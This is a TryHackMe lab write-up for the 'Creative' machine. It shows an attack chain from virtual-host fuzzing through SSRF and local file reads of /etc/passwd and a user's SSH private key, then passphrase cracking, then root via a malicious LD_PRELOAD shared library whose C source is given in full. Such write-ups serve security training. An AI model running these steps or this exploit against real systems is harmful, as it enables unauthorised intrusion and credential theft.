---
title: "Creative - TryHackMe"
date: 2026-04-04 02:00:00 +0000
categories: [TryHackMe, Writeups]
tags: [csrf, lfi, privilege-escalation, ssh]
image: /assets/img/writeups/covers/creative.svg
---
# Creative — TryHackMe Write-up

**Platform:** TryHackMe<br>**Difficulty:** Medium<br>**Category:** Web Application

---

## Summary
[Creative](https://tryhackme.com/room/creative) is a medium-difficulty TryHackMe machine that chains together multiple vulnerabilities — Server-Side Request Forgery (SSRF), Local File Inclusion (LFI), SSH key extraction, and a Linux privilege escalation technique using `LD_PRELOAD`. The box simulates a real-world scenario where a poorly secured internal service leads to full system compromise.

---

## Tools Used
- nmap
- ffuf
- curl / browser
- ssh2john
- john
- gcc
- ssh

---

## Phase 1: Initial Enumeration

### Step 1 — Add to /etc/hosts

Before anything else, add the target to your `/etc/hosts` file so the domain resolves correctly:

```
$ echo "10.48.189.74 creative.thm" >> /etc/hosts
```

![1.png](/assets/img/writeups/creative/1.png)

---

### Step 2 — Nmap Scan

Run an nmap scan to identify open ports and services:

```
$ nmap -sC -sV 10.48.189.74
```

**Results:**

| Port | Service |
|------|---------|
| 22   | SSH     |
| 80   | HTTP    |

Two ports open — SSH and a web server. Let's start with HTTP.

---

### Step 3 — Subdomain Discovery

Browsing to `http://creative.thm` shows a basic website. Standard directory busting won't get us far here. Instead, we use `ffuf` to fuzz for virtual hosts (subdomains):

```
$ ffuf -w /usr/share/wordlists/dirb/common.txt -u http://creative.thm -H "Host: FUZZ.creative.thm" -fs 6
```

The `-fs 6` flag filters out responses with 6 bytes — this removes false positives that return the same default page.<br><br>**Result:** A subdomain is discovered — `beta.creative.thm`<br><br>Add it to `/etc/hosts`:

```
$ echo "10.48.189.74 beta.creative.thm" >> /etc/hosts
```

![1.png](/assets/img/writeups/creative/2.png)

---

## Phase 2: Exploiting SSRF for User Access

### Step 4 — Identify SSRF

Browse to `http://beta.creative.thm`. You will find a URL submission form — it appears to fetch and display the content of a URL you provide.

Test it with the loopback address:

```
http://127.0.0.1
```

![1.png](/assets/img/writeups/creative/3.png)

The server returns internal content — confirming **Server-Side Request Forgery (SSRF)**. This means the server is making requests on our behalf, including to its own internal network.

---

### Step 5 — Internal Port Scan via SSRF
To find services running internally, I used SSRFmap — a tool that automates SSRF exploitation including port scanning.<br><br>First, I captured the POST request from the URL submission form using Burp Suite and saved it to a file called `output.txt`.
![1.png](/assets/img/writeups/creative/4.png)
Then I ran SSRFmap with the portscan module against that saved request: 
```
$ python3 ssrfmap.py -r ~/Downloads/output.txt -p url -m portscan
```

- `-r` — path to the saved Burp request file
- `-p url` — the parameter to inject into
- `-m` portscan — the module to run (internal port scanner)

![1.png](/assets/img/writeups/creative/5.png)

Result: An internal service is running on port 1337.

### Step 6 — Local File Inclusion via SSRF

The internal service on port 1337 appears to serve local files. We can abuse this through the SSRF to read files on the system:

```
http://127.0.0.1:1337/etc/passwd
```

![1.png](/assets/img/writeups/creative/6.png)

Reading `/etc/passwd` confirms the existence of a user named **saad** on the system.

---

### Step 7 — Extract SSH Private Key

Now we read saad's private SSH key through the same SSRF + LFI chain:

```
http://127.0.0.1:1337/home/saad/.ssh/id_rsa
```

![1.png](/assets/img/writeups/creative/7.png)

Copy the entire key and save it locally:

```
$ nano id_rsa
$ chmod 600 id_rsa
```

---

### Step 8 — Crack the Key Passphrase

The private key is passphrase-protected. We use `ssh2john` to convert it into a crackable hash, then `john` to crack it:

```
$ ssh2john id_rsa > hash.txt
$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

![1.png](/assets/img/writeups/creative/8.png)

Note the cracked passphrase — you will need it to log in.

---

### Step 9 — SSH into the Machine

Use the key and passphrase to log in as saad:

```
$ ssh -i id_rsa saad@10.48.189.74
```

Enter the cracked passphrase when prompted.

![1.png](/assets/img/writeups/creative/9.png)

Grab the user flag:

```
$ cat /home/saad/user.txt
```

---

## Phase 3: Privilege Escalation to Root

### Step 10 — Check Sudo Permissions
To check what saad can run with sudo, his sudo password is required, which can be retrieved from his Bash history using `cat /home/saad/.bash_history`.
![1.png](/assets/img/writeups/creative/10.png)
Now, run:
```
$ sudo -l
```

**Output reveals two important things:**

1. saad can run `/usr/bin/ping` as root
2. `env_keep += LD_PRELOAD` is set

````
saad@ip-10-49-191-72:~$ sudo -l
[sudo] password for saad: 
Matching Defaults entries for saad on ip-10-49-191-72:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    env_keep+=LD_PRELOAD

User saad may run the following commands on ip-10-49-191-72:
    (root) /usr/bin/ping
````

`LD_PRELOAD` is an environment variable that tells Linux to load a specified shared library before any other. When combined with a sudo command, this is a well-known privilege escalation technique — we can inject our own malicious library that runs as root.

---

### Step 11 — Write the Exploit

Create a malicious C file in `/tmp`:

```
$ nano /tmp/shell.c
```

Paste the following code:

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

This code does the following when loaded:
- Clears the `LD_PRELOAD` variable to avoid loops
- Sets both group ID and user ID to 0 (root)
- Spawns a bash shell — which will run as root

---

### Step 12 — Compile the Exploit

Compile the C file into a shared object (`.so`) library:

```
$ gcc -fPIC -shared -o /tmp/shell.so /tmp/shell.c -nostartfiles
```

- `-fPIC` — Position Independent Code, required for shared libraries
- `-shared` — compile as a shared library
- `-nostartfiles` — skip standard startup files since we have our own `_init`

---

### Step 13 — Execute and Get Root

Run ping with `LD_PRELOAD` pointing to our malicious library:

```
$ sudo LD_PRELOAD=/tmp/shell.so /usr/bin/ping
```

![1.png](/assets/img/writeups/creative/11.png)

You are now root. Capture the final flag:

```
$ cat /root/root.txt
```

---
